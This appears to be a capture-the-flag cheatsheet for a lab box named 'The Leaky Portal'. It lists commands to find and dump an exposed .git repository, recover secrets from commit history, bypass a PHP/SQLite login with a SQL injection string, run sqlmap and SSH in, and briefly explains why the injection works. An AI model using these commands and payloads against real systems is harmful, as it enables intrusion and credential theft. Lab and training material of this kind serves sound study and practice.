# Cheatsheet — The Leaky Portal

## Targets

- **portal01** — php/sqlite portal + an exposed repo

## Useful commands

```bash
curl -sI http://<ip>/.git/HEAD                    # leaked? status 200
git-dumper http://<ip>/.git/ ~/portal-dump        # reconstruct the repo
cd ~/portal-dump && git log -p                    # history = deleted secrets
git show HEAD~1:config.php                        # read the scrubbed commit

# login bypass (raw string interpolation)
curl -s -c c.txt -d 'username=admin'\'' OR 1=1-- -&password=x' http://<ip>/
sqlmap -u 'http://<ip>/' --forms --batch

ssh deploy@<ip>
```

## Concepts

- Source disclosure is a *first-order* vuln — secrets in history stay secret
  to no one
- `' OR '1'='1' -- ` makes `AND password='x'` irrelevant — the WHERE is always true
- Recon before exploitation: the fastest win isn't always on the form you see
